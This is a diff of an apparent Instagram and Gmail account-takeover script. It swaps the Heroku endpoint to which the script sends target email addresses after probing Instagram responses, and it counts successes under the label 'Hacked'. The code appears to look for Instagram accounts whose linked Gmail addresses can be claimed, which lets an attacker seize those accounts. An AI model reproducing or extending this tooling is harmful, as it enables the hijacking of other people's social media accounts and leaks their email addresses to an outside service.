@@ -52,7 +52,7 @@ def gmail1():
                 os.system('cls'if os.name=='nt'else'clear')
                 print(f'\033[1;37mHacked : \033[1;32m{a} \033[1;34m- \033[1;37mBad Gmail : \033[1;31m{s} \033[1;34m- \033[1;37mBad Instagram : \033[1;33m{b}\n')
             elif ('"bad_password"') in re:
-                url = requests.get(f'https://api-gmail-97f03023f7dd.herokuapp.com/api/gmail/v1/v.1/{email}')
+                url = requests.get(f'https://api-gm-55185f4bd1c1.herokuapp.com/api/gmail/v1/v.1/{email}')
              
                 try:
                     res=url
@@ -227,7 +227,7 @@ def gmail():
             elif ('"Sorry, there was a problem with your request.') in rf:
                 time.sleep(5)
             elif ('"user":true,') in rf:
-                url = requests.get(f'https://api-gmail-97f03023f7dd.herokuapp.com/api/gmail/v1/v.1/{email}')
+                url = requests.get(f'https://api-gm-55185f4bd1c1.herokuapp.com/api/gmail/v1/v.1/{email}')
              
                 try:
                     res=url
